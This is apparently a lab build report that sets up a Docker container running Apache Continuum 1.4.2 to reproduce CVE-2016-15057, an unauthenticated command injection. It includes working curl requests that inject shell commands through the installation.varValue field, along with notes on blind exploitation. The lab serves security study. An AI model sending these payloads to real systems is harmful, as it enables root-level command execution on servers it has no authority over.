# Lab Build Report: CVE-2016-15057

## CVE ID
CVE-2016-15057

## Lab Architecture

### Overview
Single-container lab running Apache Continuum 1.4.2 with an embedded Jetty 8.1.7 server and Derby database. No external services required — the application is fully self-contained.

### Architecture Decision
**Single container** — Apache Continuum uses an embedded Jetty web server and embedded Derby database. No external database or cache connections needed. The application is a standalone Java application started via the Tanuki Java Service Wrapper.

### Container Topology
```
┌─────────────────────────────────────────┐
│  cve-2016-15057-vulnerable              │
│  Apache Continuum 1.4.2                 │
│  ┌─────────────────────────────────┐    │
│  │  Jetty 8.1.7 (port 8080)       │    │
│  │  ├── Struts2 webapp             │    │
│  │  │   └── /continuum/*           │    │
│  │  └── Embedded Derby DB          │    │
│  └─────────────────────────────────┘    │
│  Azul Zulu OpenJDK 7 (1.7.0_352)       │
│  Tanuki Java Service Wrapper 3.2.3      │
└─────────────────────────────────────────┘
```

---

## Container Details

### cve-2016-15057-vulnerable
| Property | Value |
|----------|-------|
| **Image** | `cve-2016-15057-vulnerable` (built from `Dockerfile.vulnerable`) |
| **Base Image** | `azul/zulu-openjdk:7` (Ubuntu 22.04 + Zulu JDK 7.56.0.11) |
| **Container Name** | `cve-2016-15057-vulnerable` |
| **Internal Port** | 8080 (Jetty) |
| **Mapped Port** | 18080 → 8080 |
| **Networks** | `lab-net` |
| **Java Version** | OpenJDK 1.7.0_352 (Zulu 7.56.0.11-CA) |
| **Application** | Apache Continuum 1.4.2 (pre-built binary) |
| **Restart Policy** | default |

### Key Endpoints
| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/continuum/` | GET | Main page (redirects to groupSummary) |
| `/continuum/about.action` | GET | Version info (requires login) |
| `/continuum/saveInstallation.action` | **POST** | **VULNERABLE ENDPOINT** — command injection |
| `/continuum/security/login.action` | POST | Login page |

### Credentials
| Username | Password | Notes |
|----------|----------|-------|
| `admin` | `admin123` | Created automatically by entrypoint setup script |

---

## Build Status

### ✅ Build: SUCCESS
- Docker image builds successfully from `Dockerfile.vulnerable`
- Uses pre-built binary from `https://archive.apache.org/dist/continuum/binaries/apache-continuum-1.4.2-bin.tar.gz`
- Java 7 runtime provided by `azul/zulu-openjdk:7` base image (runs under QEMU emulation on arm64 hosts)

### ✅ Startup: SUCCESS
- Continuum starts in ~60-70 seconds via Tanuki Java Service Wrapper (console mode)
- Healthcheck confirms service availability on port 8080
- Auto-setup script creates admin user on first boot (handles CSRF tokens)

### ✅ Vulnerability: CONFIRMED
- Unauthenticated command injection via `POST /continuum/saveInstallation.action`
- Both `$(command)` and `` `command` `` injection vectors work
- Commands execute as `root` (uid=0)

---

## Start/Stop Commands

### Start Lab
```bash
docker compose up -d
```

### Stop Lab
```bash
docker compose down
```

### Pull Latest Image
```bash
docker compose pull
docker compose up -d
```

### View Logs
```bash
docker compose logs -f vulnerable
```

### Get Container IP (for PoC)
```bash
CONTAINER_IP=$(docker inspect cve-2016-15057-vulnerable --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}')
echo "Target: http://${CONTAINER_IP}:8080/continuum/"
```

---

## Verification Evidence

### Test 1: Endpoint Accessibility (Unauthenticated)
```
POST /continuum/saveInstallation.action → HTTP 200
```
The endpoint is accessible without authentication. The command injection occurs during the Struts2 validation phase (before the authorization interceptor), so no credentials are needed.

### Test 2: Command Injection via $(command)
```bash
curl -X POST "http://${CONTAINER_IP}:8080/continuum/saveInstallation.action" \
  --data-urlencode "installation.name=test" \
  --data-urlencode "installation.type=jdk" \
  --data-urlencode 'installation.varValue=$(id > /tmp/cve_proof)'

# Result: /tmp/cve_proof contains:
# uid=0(root) gid=0(root) groups=0(root)
```

### Test 3: Command Injection via Backticks
```bash
curl -X POST "http://${CONTAINER_IP}:8080/continuum/saveInstallation.action" \
  -d "installation.name=test&installation.type=jdk&installation.varValue=%60hostname+>+/tmp/proof%60"

# Result: /tmp/proof contains the container hostname
```

### Test 4: Container Health
```
NAME                        IMAGE                       STATUS              PORTS
cve-2016-15057-vulnerable   cve-2016-15057-vulnerable   Up (healthy)        0.0.0.0:18080->8080/tcp
```

---

## Workarounds Applied

1. **32-bit wrapper binary removed**: The Tanuki Java Service Wrapper ships with both 32-bit and 64-bit binaries. The startup script prefers the 32-bit binary, but it requires `/lib/ld-linux.so.2` which is not available in the 64-bit-only environment. Removed `bin/wrapper-linux-x86-32` and `lib/libwrapper-linux-x86-32.so` so the script falls through to the 64-bit binary.

2. **QEMU emulation**: The `azul/zulu-openjdk:7` base image is x86_64 only (JDK 7 predates widespread arm64 support). On arm64 hosts, Docker uses QEMU user-mode emulation. This adds ~2x overhead to startup time but works correctly for the lab.

3. **CSRF token handling**: The admin setup wizard uses Struts2 token-based CSRF protection. The auto-setup script (`setup-continuum.sh`) extracts the token from the setup page and includes it in the POST request.

4. **Project name isolation**: Run `docker compose` from the CVE-2016-15057 directory to ensure correct project naming.

---

## Known Issues

1. **Slow startup on arm64**: Due to QEMU emulation, Continuum takes ~60-70 seconds to start (vs ~15-20 seconds on native x86_64). The healthcheck has a 90-second start period to accommodate this.

2. **Blind injection**: Command injection is blind — output is not reflected in the HTTP response. Verify exploitation via file writes (`id > /tmp/proof`) or time-based delays (`sleep N`).

3. **Setup wizard prerequisite**: The vulnerability requires the initial admin user to be created first (the `redbackForceAdminUser` interceptor redirects all requests to the setup wizard otherwise). The entrypoint script handles this automatically, but if the container is recreated without volumes, setup runs again on first boot.

---

## Files in Lab Directory

| File | Purpose |
|------|---------|
| `Dockerfile.vulnerable` | Builds the vulnerable container (Zulu JDK 7 + Continuum 1.4.2 binary) |
| `docker-compose.yml` | Orchestrates the container with networking |
| `entrypoint.sh` | Container entrypoint — starts wrapper + setup script |
| `setup-continuum.sh` | Auto-completes admin setup wizard on first boot |

---

## PoC Notes

### Target Information
- **Container**: `cve-2016-15057-vulnerable`
- **Network**: `lab-net`
- **Port**: 8080 (internal), 18080 (host-mapped)
- **Base URL**: `http://<CONTAINER_IP>:8080/continuum`

### Exploitation Quick Reference
```bash
# Get container IP
CONTAINER_IP=$(docker inspect cve-2016-15057-vulnerable --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}')

# Exploit: File-based proof
curl -X POST "http://${CONTAINER_IP}:8080/continuum/saveInstallation.action" \
  --data-urlencode "installation.name=pwn" \
  --data-urlencode "installation.type=jdk" \
  --data-urlencode 'installation.varValue=$(id > /tmp/pwned)'

# Verify
docker exec cve-2016-15057-vulnerable cat /tmp/pwned
# Expected: uid=0(root) gid=0(root) groups=0(root)
```

### Important Notes for PoC
- The injection is **blind** — use file writes or OOB callbacks to exfiltrate output
- Both `$(command)` and `` `command` `` work; `$(command)` passes the regex validator cleanly
- Supported `installation.type` values that trigger immediate execution: `jdk`, `maven2`, `maven1`, `ant`
- The `installation.name` parameter can be any non-empty string
- No authentication or session cookies required
